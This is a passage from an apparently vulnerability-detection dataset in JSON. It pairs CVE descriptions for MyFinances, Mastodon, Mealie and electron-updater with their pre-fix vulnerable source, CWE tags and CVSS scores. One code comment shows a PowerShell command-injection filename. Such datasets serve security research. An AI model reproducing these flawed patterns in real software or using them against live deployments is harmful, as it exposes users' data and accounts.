self.get_article_urls(browser, root_url, url, max_depth)\n            )\n\n        page.close()\n\n        return article_urls"
      ],
      "hunk_level": [
        {
          "line_no": 130,
          "content": "        self, browser: Any, root_url: str, current_url: str, max_depth: int = 100"
        },
        {
          "line_no": 165,
          "content": "                self.get_article_urls(browser, root_url, url, max_depth)"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 858,
    "cve": "CVE-2024-37889",
    "description": "MyFinances is a web application for managing finances. MyFinances has a way to access other customer invoices while signed in as a user. This method allows an actor to access PII and financial information from another account. The vulnerability is fixed in 0.4.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "backend/views/core/invoices/edit.py",
          "content": "from datetime import datetime\n\nfrom django.contrib import messages\nfrom django.http import JsonResponse\nfrom django.shortcuts import render\nfrom django.views.decorators.http import require_http_methods\n\nfrom backend.models import Invoice, Client, InvoiceItem\nfrom backend.types.htmx import HtmxHttpRequest\n\n\n# RELATED PATH FILES : \\frontend\\templates\\pages\\invoices\\dashboard\\_fetch_body.html, \\backend\\urls.py\n\n\n# Function that takes an invoice object and makes a dict of its attributes\ndef invoice_get_existing_data(invoice_obj):\n    stored_data = {\n        \"from_name\": invoice_obj.self_name,\n        \"from_company\": invoice_obj.self_company,\n        \"from_address\": invoice_obj.self_address,\n        \"from_city\": invoice_obj.self_city,\n        \"from_county\": invoice_obj.self_county,\n        \"from_country\": invoice_obj.self_country,\n        \"from_date_issued\": invoice_obj.date_issued,\n        \"from_date_due\": invoice_obj.date_due,\n        \"issue_date\": invoice_obj.date_issued,\n        \"due_date\": invoice_obj.date_due,\n        \"invoice_object\": invoice_obj,\n        \"currency_symbol\": invoice_obj.get_currency_symbol(),\n        \"rows\": invoice_obj.items.all(),\n    }\n    if invoice_obj.client_to:\n        stored_data[\"to_name\"] = invoice_obj.client_to.name\n        stored_data[\"to_company\"] = invoice_obj.client_to.company\n        stored_data[\"is_representative\"] = invoice_obj.client_to.is_representative\n        # stored_data[\"to_address\"] = invoice_obj.client_to.address\n        # stored_data[\"to_city\"] = invoice_obj.client_to.city\n        # stored_data[\"to_county\"] = invoice_obj.client_to.county\n        # stored_data[\"to_country\"] = invoice_obj.client_to.country\n    else:\n        stored_data[\"to_name\"] = invoice_obj.client_name\n        stored_data[\"to_company\"] = invoice_obj.client_company\n        stored_data[\"to_address\"] = invoice_obj.client_address\n        stored_data[\"to_city\"] = invoice_obj.client_city\n        stored_data[\"to_county\"] = invoice_obj.client_county\n        stored_data[\"to_country\"] = invoice_obj.client_country\n        stored_data[\"is_representative\"] = invoice_obj.client_is_representative\n\n    if invoice_obj.client_to:\n        stored_data[\"existing_client\"] = invoice_obj.client_to\n\n    return stored_data\n\n\n# gets invoice object from invoice id, convert obj to dict, and renders edit.html while passing the stored invoice values to frontend\ndef invoice_edit_page_get(request, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n    data_to_populate = invoice_get_existing_data(invoice)\n    return render(request, \"pages/invoices/edit/edit.html\", data_to_populate)\n\n\n# when user changes/modifies any of the fields with new information (during edit invoice)\n@require_http_methods([\"POST\"])\ndef edit_invoice(request: HtmxHttpRequest, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n    elif request.user != invoice.user:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n\n    attributes_to_updates = {\n        \"date_due\": datetime.strptime(request.POST.get(\"date_due\"), \"%Y-%m-%d\").date(),  # type: ignore[arg-type]\n        \"date_issued\": request.POST.get(\"date_issued\"),\n        \"self_name\": request.POST.get(\"from_name\"),\n        \"self_company\": request.POST.get(\"from_company\"),\n        \"self_address\": request.POST.get(\"from_address\"),\n        \"self_city\": request.POST.get(\"from_city\"),\n        \"self_county\": request.POST.get(\"from_county\"),\n        \"self_country\": request.POST.get(\"from_country\"),\n        \"notes\": request.POST.get(\"notes\"),\n        \"invoice_number\": request.POST.get(\"invoice_number\"),\n        \"vat_number\": request.POST.get(\"vat_number\"),\n        \"reference\": request.POST.get(\"reference\"),\n        \"sort_code\": request.POST.get(\"sort_code\"),\n        \"account_number\": request.POST.get(\"account_number\"),\n        \"account_holder_name\": request.POST.get(\"account_holder_name\"),\n    }\n\n    client_to_id = request.POST.get(\"selected_client\")\n    try:\n        client_to_obj = Client.objects.get(id=client_to_id, user=request.user)  # type: ignore[misc]\n    except (Client.DoesNotExist, ValueError):\n        client_to_obj = None\n\n    if client_to_obj:\n        invoice.client_to = client_to_obj\n    else:\n        attributes_to_updates.update(\n            {\n                \"client_name\": request.POST.get(\"to_name\"),\n                \"client_company\": request.POST.get(\"to_company\"),\n                \"client_address\": request.POST.get(\"to_address\"),\n                \"client_city\": request.POST.get(\"to_city\"),\n                \"client_county\": request.POST.get(\"to_county\"),\n                \"client_country\": request.POST.get(\"to_country\"),\n            }\n        )\n\n    for column_name, new_value in attributes_to_updates.items():\n        setattr(invoice, column_name, new_value)\n\n    invoice_items = [\n        InvoiceItem.objects.create(name=row[0], description=row[1], hours=row[2], price_per_hour=row[3])\n        for row in zip(\n            request.POST.getlist(\"service_name[]\"),\n            request.POST.getlist(\"service_description[]\"),\n            request.POST.getlist(\"hours[]\"),\n            request.POST.getlist(\"price_per_hour[]\"),\n        )\n    ]\n\n    if invoice_items:\n        invoice.items.set(invoice_items)\n\n    invoice.save()\n\n    messages.success(request, \"Invoice edited\")\n\n    if request.htmx:\n        return render(request, \"base/toasts.html\")\n\n    return invoice_edit_page_get(request, invoice_id)\n\n\n# decorator & view function for rendering page and updating invoice items in the backend\n@require_http_methods([\"GET\", \"POST\"])\ndef edit_invoice_page(request: HtmxHttpRequest, invoice_id):\n    if request.method == \"POST\":\n        return edit_invoice(request, invoice_id)\n    return invoice_edit_page_get(request, invoice_id)\n"
        }
      ],
      "method_level": [
        "def invoice_edit_page_get(request, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    # use to populate fields with existing data in edit_from_destination.html AND edit_to_destination.html\n    data_to_populate = invoice_get_existing_data(invoice)\n    return render(request, \"pages/invoices/edit/edit.html\", data_to_populate)",
        "def edit_invoice(request: HtmxHttpRequest, invoice_id):\n    try:\n        invoice = Invoice.objects.get(id=invoice_id)\n    except Invoice.DoesNotExist:\n        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)\n\n    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n    elif request.user != invoice.user:\n        return JsonResponse(\n            {\"message\": \"You do not have permission to edit this invoice\"},\n            status=403,\n        )\n\n    attributes_to_updates = {\n        \"date_due\": datetime.strptime(request.POST.get(\"date_due\"), \"%Y-%m-%d\").date(),  # type: ignore[arg-type]\n        \"date_issued\": request.POST.get(\"date_issued\"),\n        \"self_name\": request.POST.get(\"from_name\"),\n        \"self_company\": request.POST.get(\"from_company\"),\n        \"self_address\": request.POST.get(\"from_address\"),\n        \"self_city\": request.POST.get(\"from_city\"),\n        \"self_county\": request.POST.get(\"from_county\"),\n        \"self_country\": request.POST.get(\"from_country\"),\n        \"notes\": request.POST.get(\"notes\"),\n        \"invoice_number\": request.POST.get(\"invoice_number\"),\n        \"vat_number\": request.POST.get(\"vat_number\"),\n        \"reference\": request.POST.get(\"reference\"),\n        \"sort_code\": request.POST.get(\"sort_code\"),\n        \"account_number\": request.POST.get(\"account_number\"),\n        \"account_holder_name\": request.POST.get(\"account_holder_name\"),\n    }\n\n    client_to_id = request.POST.get(\"selected_client\")\n    try:\n        client_to_obj = Client.objects.get(id=client_to_id, user=request.user)  # type: ignore[misc]\n    except (Client.DoesNotExist, ValueError):\n        client_to_obj = None\n\n    if client_to_obj:\n        invoice.client_to = client_to_obj\n    else:\n        attributes_to_updates.update(\n            {\n                \"client_name\": request.POST.get(\"to_name\"),\n                \"client_company\": request.POST.get(\"to_company\"),\n                \"client_address\": request.POST.get(\"to_address\"),\n                \"client_city\": request.POST.get(\"to_city\"),\n                \"client_county\": request.POST.get(\"to_county\"),\n                \"client_country\": request.POST.get(\"to_country\"),\n            }\n        )\n\n    for column_name, new_value in attributes_to_updates.items():\n        setattr(invoice, column_name, new_value)\n\n    invoice_items = [\n        InvoiceItem.objects.create(name=row[0], description=row[1], hours=row[2], price_per_hour=row[3])\n        for row in zip(\n            request.POST.getlist(\"service_name[]\"),\n            request.POST.getlist(\"service_description[]\"),\n            request.POST.getlist(\"hours[]\"),\n            request.POST.getlist(\"price_per_hour[]\"),\n        )\n    ]\n\n    if invoice_items:\n        invoice.items.set(invoice_items)\n\n    invoice.save()\n\n    messages.success(request, \"Invoice edited\")\n\n    if request.htmx:\n        return render(request, \"base/toasts.html\")\n\n    return invoice_edit_page_get(request, invoice_id)"
      ],
      "hunk_level": [
        {
          "line_no": 60,
          "content": "        return JsonResponse({\"message\": \"Invoice not found\"}, status=404)"
        },
        {
          "line_no": 75,
          "content": "    if request.user.logged_in_as_team and request.user.logged_in_as_team != invoice.organization:"
        },
        {
          "line_no": 76,
          "content": "        return JsonResponse("
        },
        {
          "line_no": 77,
          "content": "            {\"message\": \"You do not have permission to edit this invoice\"},"
        },
        {
          "line_no": 78,
          "content": "            status=403,"
        },
        {
          "line_no": 79,
          "content": "        )"
        },
        {
          "line_no": 80,
          "content": "    elif request.user != invoice.user:"
        }
      ]
    },
    "cwe": [
      "CWE-639"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 289,
    "cve": "CVE-2024-25618",
    "description": "Mastodon is a free, open-source social network server based on ActivityPub. Mastodon allows new identities from configured authentication providers (CAS, SAML, OIDC) to attach to existing local users with the same e-mail address. This results in a possible account takeover if the authentication provider allows changing the e-mail address or multiple authentication providers are configured. When a user logs in through an external authentication provider for the first time, Mastodon checks the e-mail address passed by the provider to find an existing account. However, using the e-mail address alone means that if the authentication provider allows changing the e-mail address of an account, the Mastodon account can immediately be hijacked. All users logging in through external authentication providers are affected. The severity is medium, as it also requires the external authentication provider to misbehave. However, some well-known OIDC providers (like Microsoft Azure) make it very easy to accidentally allow unverified e-mail changes. Moreover, OpenID Connect also allows dynamic client registration. This issue has been addressed in versions 4.2.6, 4.1.14, 4.0.14, and 3.5.18. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/controllers/auth/omniauth_callbacks_controller.rb",
          "content": "# frozen_string_literal: true\n\nclass Auth::OmniauthCallbacksController < Devise::OmniauthCallbacksController\n  skip_before_action :check_self_destruct!\n  skip_before_action :verify_authenticity_token\n\n  def self.provides_callback_for(provider)\n    define_method provider do\n      @provider = provider\n      @user = User.find_for_oauth(request.env['omniauth.auth'], current_user)\n\n      if @user.persisted?\n        record_login_activity\n        sign_in_and_redirect @user, event: :authentication\n        set_flash_message(:notice, :success, kind: label_for_provider) if is_navigational_format?\n      else\n        session[\"devise.#{provider}_data\"] = request.env['omniauth.auth']\n        redirect_to new_user_registration_url\n      end\n    end\n  end\n\n  Devise.omniauth_configs.each_key do |provider|\n    provides_callback_for provider\n  end\n\n  def after_sign_in_path_for(resource)\n    if resource.email_present?\n      stored_location_for(resource) || root_path\n    else\n      auth_setup_path(missing_email: '1')\n    end\n  end\n\n  private\n\n  def record_login_activity\n    LoginActivity.create(\n      user: @user,\n      success: true,\n      authentication_method: :omniauth,\n      provider: @provider,\n      ip: request.remote_ip,\n      user_agent: request.user_agent\n    )\n  end\n\n  def label_for_provider\n    provider_display_name || configured_provider_name\n  end\n\n  def provider_display_name\n    Devise.omniauth_configs[@provider]&.strategy&.display_name.presence\n  end\n\n  def configured_provider_name\n    I18n.t(\"auth.providers.#{@provider}\", default: @provider.to_s.chomp('_oauth2').capitalize)\n  end\nend\n"
        },
        {
          "name": "app/models/concerns/user/omniauthable.rb",
          "content": "# frozen_string_literal: true\n\nmodule User::Omniauthable\n  extend ActiveSupport::Concern\n\n  TEMP_EMAIL_PREFIX = 'change@me'\n  TEMP_EMAIL_REGEX  = /\\A#{TEMP_EMAIL_PREFIX}/\n\n  included do\n    devise :omniauthable\n\n    def omniauth_providers\n      Devise.omniauth_configs.keys\n    end\n\n    def email_present?\n      email && email !~ TEMP_EMAIL_REGEX\n    end\n  end\n\n  class_methods do\n    def find_for_oauth(auth, signed_in_resource = nil)\n      # EOLE-SSO Patch\n      auth.uid = (auth.uid[0][:uid] || auth.uid[0][:user]) if auth.uid.is_a? Hashie::Array\n      identity = Identity.find_for_oauth(auth)\n\n      # If a signed_in_resource is provided it always overrides the existing user\n      # to prevent the identity being locked with accidentally created accounts.\n      # Note that this may leave zombie accounts (with no associated identity) which\n      # can be cleaned up at a later date.\n      user   = signed_in_resource || identity.user\n      user ||= create_for_oauth(auth)\n\n      if identity.user.nil?\n        identity.user = user\n        identity.save!\n      end\n\n      user\n    end\n\n    def create_for_oauth(auth)\n      # Check if the user exists with provided email. If no email was provided,\n      # we assign a temporary email and ask the user to verify it on\n      # the next step via Auth::SetupController.show\n\n      strategy          = Devise.omniauth_configs[auth.provider.to_sym].strategy\n      assume_verified   = strategy&.security&.assume_email_is_verified\n      email_is_verified = auth.info.verified || auth.info.verified_email || auth.info.email_verified || assume_verified\n      email             = auth.info.verified_email || auth.info.email\n\n      user = User.find_by(email: email) if email_is_verified\n\n      return user unless user.nil?\n\n      user = User.new(user_params_from_auth(email, auth))\n\n      begin\n        user.account.avatar_remote_url = auth.info.image if /\\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\\z/.match?(auth.info.image)\n      rescue Mastodon::UnexpectedResponseError\n        user.account.avatar_remote_url = nil\n      end\n\n      user.mark_email_as_confirmed! if email_is_verified\n      user.save!\n      user\n    end\n\n    private\n\n    def user_params_from_auth(email, auth)\n      {\n        email: email || \"#{TEMP_EMAIL_PREFIX}-#{auth.uid}-#{auth.provider}.com\",\n        agreement: true,\n        external: true,\n        account_attributes: {\n          username: ensure_unique_username(ensure_valid_username(auth.uid)),\n          display_name: auth.info.full_name || auth.info.name || [auth.info.first_name, auth.info.last_name].join(' '),\n        },\n      }\n    end\n\n    def ensure_unique_username(starting_username)\n      username = starting_username\n      i        = 0\n\n      while Account.exists?(username: username, domain: nil)\n        i       += 1\n        username = \"#{starting_username}_#{i}\"\n      end\n\n      username\n    end\n\n    def ensure_valid_username(starting_username)\n      starting_username = starting_username.split('@')[0]\n      temp_username = starting_username.gsub(/[^a-z0-9_]+/i, '')\n      temp_username.truncate(30, omission: '')\n    end\n  end\nend\n"
        },
        {
          "name": "app/models/identity.rb",
          "content": "# frozen_string_literal: true\n\n# == Schema Information\n#\n# Table name: identities\n#\n#  provider   :string           default(\"\"), not null\n#  uid        :string           default(\"\"), not null\n#  created_at :datetime         not null\n#  updated_at :datetime         not null\n#  id         :bigint(8)        not null, primary key\n#  user_id    :bigint(8)\n#\n\nclass Identity < ApplicationRecord\n  belongs_to :user\n  validates :uid, presence: true, uniqueness: { scope: :provider }\n  validates :provider, presence: true\n\n  def self.find_for_oauth(auth)\n    find_or_create_by(uid: auth.uid, provider: auth.provider)\n  end\nend\n"
        }
      ],
      "method_level": [
        "def self.provides_callback_for(provider)\n    define_method provider do\n      @provider = provider\n      @user = User.find_for_oauth(request.env['omniauth.auth'], current_user)\n\n      if @user.persisted?\n        record_login_activity\n        sign_in_and_redirect @user, event: :authentication\n        set_flash_message(:notice, :success, kind: label_for_provider) if is_navigational_format?\n      else\n        session[\"devise.#{provider}_data\"] = request.env['omniauth.auth']\n        redirect_to new_user_registration_url\n      end\n    end\n  end",
        "def find_for_oauth(auth, signed_in_resource = nil)\n      # EOLE-SSO Patch\n      auth.uid = (auth.uid[0][:uid] || auth.uid[0][:user]) if auth.uid.is_a? Hashie::Array\n      identity = Identity.find_for_oauth(auth)\n\n      # If a signed_in_resource is provided it always overrides the existing user\n      # to prevent the identity being locked with accidentally created accounts.\n      # Note that this may leave zombie accounts (with no associated identity) which\n      # can be cleaned up at a later date.\n      user   = signed_in_resource || identity.user\n      user ||= create_for_oauth(auth)\n\n      if identity.user.nil?\n        identity.user = user\n        identity.save!\n      end\n\n      user\n    end",
        "def create_for_oauth(auth)\n      # Check if the user exists with provided email. If no email was provided,\n      # we assign a temporary email and ask the user to verify it on\n      # the next step via Auth::SetupController.show\n\n      strategy          = Devise.omniauth_configs[auth.provider.to_sym].strategy\n      assume_verified   = strategy&.security&.assume_email_is_verified\n      email_is_verified = auth.info.verified || auth.info.verified_email || auth.info.email_verified || assume_verified\n      email             = auth.info.verified_email || auth.info.email\n\n      user = User.find_by(email: email) if email_is_verified\n\n      return user unless user.nil?\n\n      user = User.new(user_params_from_auth(email, auth))\n\n      begin\n        user.account.avatar_remote_url = auth.info.image if /\\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\\z/.match?(auth.info.image)\n      rescue Mastodon::UnexpectedResponseError\n        user.account.avatar_remote_url = nil\n      end\n\n      user.mark_email_as_confirmed! if email_is_verified\n      user.save!\n      user\n    end",
        "def self.find_for_oauth(auth)\n    find_or_create_by(uid: auth.uid, provider: auth.provider)\n  end"
      ],
      "hunk_level": [
        {
          "line_no": 10,
          "content": "      @user = User.find_for_oauth(request.env['omniauth.auth'], current_user)"
        },
        {
          "line_no": 22,
          "content": "    def find_for_oauth(auth, signed_in_resource = nil)"
        },
        {
          "line_no": 25,
          "content": "      identity = Identity.find_for_oauth(auth)"
        },
        {
          "line_no": 32,
          "content": "      user ||= create_for_oauth(auth)"
        },
        {
          "line_no": 42,
          "content": "    def create_for_oauth(auth)"
        },
        {
          "line_no": 43,
          "content": "      # Check if the user exists with provided email. If no email was provided,"
        },
        {
          "line_no": 44,
          "content": "      # we assign a temporary email and ask the user to verify it on"
        },
        {
          "line_no": 45,
          "content": "      # the next step via Auth::SetupController.show"
        },
        {
          "line_no": 47,
          "content": "      strategy          = Devise.omniauth_configs[auth.provider.to_sym].strategy"
        },
        {
          "line_no": 48,
          "content": "      assume_verified   = strategy&.security&.assume_email_is_verified"
        },
        {
          "line_no": 49,
          "content": "      email_is_verified = auth.info.verified || auth.info.verified_email || auth.info.email_verified || assume_verified"
        },
        {
          "line_no": 50,
          "content": "      email             = auth.info.verified_email || auth.info.email"
        },
        {
          "line_no": 52,
          "content": "      user = User.find_by(email: email) if email_is_verified"
        },
        {
          "line_no": 54,
          "content": "      return user unless user.nil?"
        },
        {
          "line_no": 20,
          "content": "  def self.find_for_oauth(auth)"
        }
      ]
    },
    "cwe": [
      "CWE-287",
      "CWE-306"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.2,
    "cvss_version": 3.1
  },
  {
    "id": 698,
    "cve": "CVE-2024-31994",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, an attacker can point the image request to an arbitrarily large file. Mealie will attempt to retrieve this file in whole. If it can be retrieved, it may be stored on the file system in whole (leading to possible disk consumption), however the more likely scenario given resource limitations is that the container will OOM during file retrieval if the target file size is greater than the allocated memory of the container. At best this can be used to force the container to infinitely restart due to OOM (if so configured in `docker-compose.yml), or at worst this can be used to force the Mealie container to crash and remain offline. In the event that the file can be retrieved, the lack of rate limiting on this endpoint also permits an attacker to generate ongoing requests to any target of their choice, potentially contributing to an external-facing DoS attack. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-770",
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 956,
    "cve": "CVE-2024-39698",
    "description": "electron-updater allows for automatic updates for Electron apps. The file `packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts` implements the signature validation routine for Electron applications on Windows. Because of the surrounding shell, a first pass by `cmd.exe` expands any environment variable found in command-line above. This creates a situation where `verifySignature()` can be tricked into validating the certificate of a different file than the one that was just downloaded. If the step is successful, the malicious update will be executed even if its signature is invalid. This attack assumes a compromised update manifest (server compromise, Man-in-the-Middle attack if fetched over HTTP, Cross-Site Scripting to point the application to a malicious updater server, etc.). The patch is available starting from 6.3.0-alpha.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/electron-updater/src/windowsExecutableCodeSignatureVerifier.ts",
          "content": "import { parseDn } from \"builder-util-runtime\"\nimport { execFile, execFileSync } from \"child_process\"\nimport * as os from \"os\"\nimport { Logger } from \"./main\"\n\n// $certificateInfo = (Get-AuthenticodeSignature 'xxx\\yyy.exe'\n// | where {$_.Status.Equals([System.Management.Automation.SignatureStatus]::Valid) -and $_.SignerCertificate.Subject.Contains(\"CN=siemens.com\")})\n// | Out-String ; if ($certificateInfo) { exit 0 } else { exit 1 }\nexport function verifySignature(publisherNames: Array<string>, unescapedTempUpdateFile: string, logger: Logger): Promise<string | null> {\n  return new Promise<string | null>((resolve, reject) => {\n    // Escape quotes and backticks in filenames to prevent user from breaking the\n    // arguments and perform a remote command injection.\n    //\n    // Consider example powershell command:\n    // ```powershell\n    // Get-AuthenticodeSignature 'C:\\\\path\\\\my-bad-';calc;'filename.exe'\n    // ```\n    // The above would work expected and find the file name, however, it will also execute `;calc;`\n    // command and start the calculator app.\n    //\n    // From Powershell quoting rules:\n    // https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-7\n    // * Double quotes `\"` are treated literally within single-quoted strings;\n    // * Single quotes can be escaped by doubling them: 'don''t' -> don't;\n    //\n    // Also note that at this point the file has already been written to the disk, thus we are\n    // guaranteed that the path will not contain any illegal characters like <>:\"/\\|?*\n    // https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file\n    const tempUpdateFile = unescapedTempUpdateFile.replace(/'/g, \"''\")\n    logger.info(`Verifying signature ${tempUpdateFile}`)\n\n    // https://github.com/electron-userland/electron-builder/issues/2421\n    // https://github.com/electron-userland/electron-builder/issues/2535\n    // Resetting PSModulePath is necessary https://github.com/electron-userland/electron-builder/issues/7127\n    execFile(\n      `set \"PSModulePath=\"; chcp 65001 >NUL & powershell.exe`,\n      [\"-NoProfile\", \"-NonInteractive\", \"-InputFormat\", \"None\", \"-Command\", `\"Get-AuthenticodeSignature -LiteralPath '${tempUpdateFile}' | ConvertTo-Json -Compress\"`],\n      {\n        shell: true,\n        timeout: 20 * 1000,\n      },\n      (error, stdout, stderr) => {\n        try {\n          if (error != null || stderr) {\n            handleError(logger, error, stderr, reject)\n            resolve(null)\n            return\n          }\n          const data = parseOut(stdout)\n          if (data.Status === 0) {\n            const subject = parseDn(data.SignerCertificate.Subject)\n            let match = false\n            for (const name of publisherNames) {\n              const dn = parseDn(name)\n              if (dn.size) {\n                // if we have a full DN, compare all values\n                const allKeys = Array.from(dn.keys())\n                match = allKeys.every(key => {\n                  return dn.get(key) === subject.get(key)\n                })\n              } else if (name === subject.get(\"CN\")!) {\n                logger.warn(`Signature validated using only CN 